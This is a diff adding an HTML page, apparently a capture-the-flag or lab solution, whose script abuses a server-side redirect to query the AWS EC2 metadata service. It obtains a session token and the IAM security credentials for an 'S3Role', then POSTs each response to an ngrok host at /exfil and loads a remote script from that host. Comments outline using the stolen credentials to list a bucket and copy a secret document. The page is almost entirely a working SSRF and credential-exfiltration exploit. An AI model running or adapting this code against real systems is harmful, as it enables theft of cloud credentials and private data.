@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Test</title>
+  </head>
+  <body>
+    MakeToken, then enumerate!
+  </body>
+  <script>
+    const host = "646551c43a18.ngrok.io";
+    var token = false;
+
+    (async () => {
+      await makeToken();
+      await step(
+        "enumerate",
+        "http://169.254.169.254/latest/meta-data/local-hostname"
+      );
+      await step(
+        "S3Role",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role"
+      );
+
+      // 1. setup aws cli to use the credentials from S3Role
+      // 2. aws s3 ls
+      // 3. aws s3 ls secretdocs
+      // 4. aws s3 cp s3://secretdocs/leviathan.txt leviathan.txt
+    })();
+
+    async function makeToken() {
+      window.token = await step(
+        "token",
+        "http://169.254.169.254/latest/api/token",
+        {
+          method: "PUT",
+          headers: {
+            "X-aws-ec2-metadata-token-ttl-seconds": 21600,
+          },
+        }
+      );
+    }
+
+    async function step(step, url, options = false) {
+      if (!options) {
+        options = {
+          headers: {
+            "X-aws-ec2-metadata-token": window.token,
+          },
+        };
+      }
+      try {
+        const response = await fetch(
+          `http://127.0.0.1/redir.php?url=${url}`,
+          options
+        );
+        const data = await response.text();
+        const headers = response.headers.entries();
+        await exfil({ step, url, headers, data });
+        return data;
+      } catch (error) {
+        await exfil({ step, url, error: error.message });
+      }
+    }
+
+    async function exfil(data) {
+      await fetch(`http://${host}/exfil`, {
+        headers: { "Content-Type": "application/json" },
+        method: "POST",
+        body: JSON.stringify(data),
+      });
+    }
+
+    const delayScript = document.createElement("script");
+    delayScript.src = `https://${host}/delay`;
+    document.body.appendChild(delayScript);
+  </script>
+</html>
